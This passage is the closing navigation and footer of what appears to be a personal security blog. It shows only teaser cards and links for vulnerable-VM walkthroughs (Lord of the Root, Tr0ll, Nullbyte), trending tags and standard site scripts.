first write-up of lord of the root 1.0.1 created by this guy #KookSec. This is apparently on the level of oscp certificate which i plan on taking so lets see… After setting it up ...</p></div></div></a></div><div class="card"> <a href="/posts/the-troller-trolled-the-tr0ll/"><div class="card-body"> <span class="timeago small" >Oct 11, 2015<i class="unloaded">2015-10-11T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>The troller trolled the Tr0ll</h3><div class="text-muted small"><p> Hey everyone so this is the VM for the tr0ll server! i know it is kind of old but since i am trolling everyday in real life i thought i would try it so tr0ll2 is on the way too :D Let me add here ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/nullbyte-0-walkthrough/" class="btn btn-outline-primary" prompt="Older"><p>Nullbyte %0 walkthrough</p></a> <a href="/posts/happy-new-year-2016/" class="btn btn-outline-primary" prompt="Newer"><p>Happy New Year 2016</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/username">trickster0</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/vm/">vm</a> <a class="post-tag" href="/tags/challenge/">challenge</a> <a class="post-tag" href="/tags/challenges/">challenges</a> <a class="post-tag" href="/tags/hack/">hack</a> <a class="post-tag" href="/tags/0/">%0</a> <a class="post-tag" href="/tags/asa/">asa</a> <a class="post-tag" href="/tags/certificate/">certificate</a> <a class="post-tag" href="/tags/cisco/">cisco</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://trickster0.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
